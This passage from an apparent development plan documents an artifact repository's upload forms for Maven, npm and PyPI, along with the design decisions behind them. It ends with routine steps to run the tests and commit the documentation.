| Maven | `group`, `artifact`, `version`, `packaging` (default `jar`), `generate_pom` (default true), and one or more files: `file` for the artifact, `file.<classifier>` for a file beside it, `pom` for the POM. What a file is (its extension) is read from the end of its own name. A POM that is uploaded is used; checksums and metadata follow as for a deploy |
| npm | One `file`, a package tarball, and optionally `tag` (default `latest`). Its `package.json` says what it is; it is published as `npm publish` would |
| PyPI | One or more `file` parts, wheels or source distributions, and optionally `summary`, `requires_python` and `keywords`, said of every file. Their names say what they are; they are stored as an upload by twine would |

The answer is `201` with the components and files that were stored. The deployment policy and the `add` and `edit` permissions apply as to any upload, and nothing else is needed: not `browse`, not `read`. A form is stored whole or not at all. A Docker repository, a proxy and a group answer `409`.

Settled while planning:

- **The POM has a part of its own.** The first draft named it `file.pom`, which reads as a classifier everywhere else. A part named `pom` is the POM whatever its file is called (`pom.xml`).
- **A POM is written only for a version that has none**, so adding a classifier to a version that exists does not try to replace its POM.
- **Snapshots are taken** by a repository whose version policy allows them, under the plain name (`app-1.0-SNAPSHOT.jar`). The metadata already ranks such a file below every timestamped build.
- **A field the format does not know is refused** (`422`), so a misspelt one is not ignored. So is a part named `file` that was sent as text.
- **An npm tarball is read into memory** to find its `package.json`, under the limit and the turn-taking of a publish. No more than 256 MiB is decompressed looking for it. A package marked `private` is refused, as `npm publish` refuses it.
- **A PyPI source distribution's name** is divided at its last hyphen (PEP 625). A version with a hyphen in it would be read as part of the name.
- **An offline repository takes uploads**, as it can be browsed and deleted from: being offline stops package clients.
- **Usage is offered only for plain names.** A snippet is pasted into a shell or a build file, and a name is chosen by whoever deployed the component, or by a remote. A component whose name or version holds anything but letters, digits and `. _ + ~ / -` gets none.
- **A Maven snippet names the kind** (`<type>`, `@war`) when the artifact is not a jar.
```

- [ ] **Step 3: Run everything**

Run: `uv run pytest -q && uv run ruff check . && uv run ruff format --check .`
Expected: 2717 passed, 1 skipped; no findings.

- [ ] **Step 4: Commit**

```bash
git add README.md docs/superpowers/specs/2026-10-11-browse-search-upload-design.md
git commit -m "docs: uploading and usage snippets"
```
